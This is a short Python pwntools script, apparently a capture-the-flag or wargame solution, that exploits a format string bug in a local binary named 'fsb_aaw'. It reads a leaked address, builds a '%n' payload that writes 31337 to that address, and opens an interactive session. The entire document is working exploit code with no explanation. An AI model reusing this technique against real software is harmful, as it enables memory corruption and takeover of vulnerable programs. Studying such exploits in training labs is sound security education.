from pwn import *

p = process('./fsb_aaw')

p.recvuntil(b':')
secret = int(p.recvline().strip(), 16)

print("secret:", hex(secret))

pay = b'%31337c%8$n'.ljust(16, b'A') # 6, but 8
pay += p64(secret)

p.sendline(pay)
p.interactive()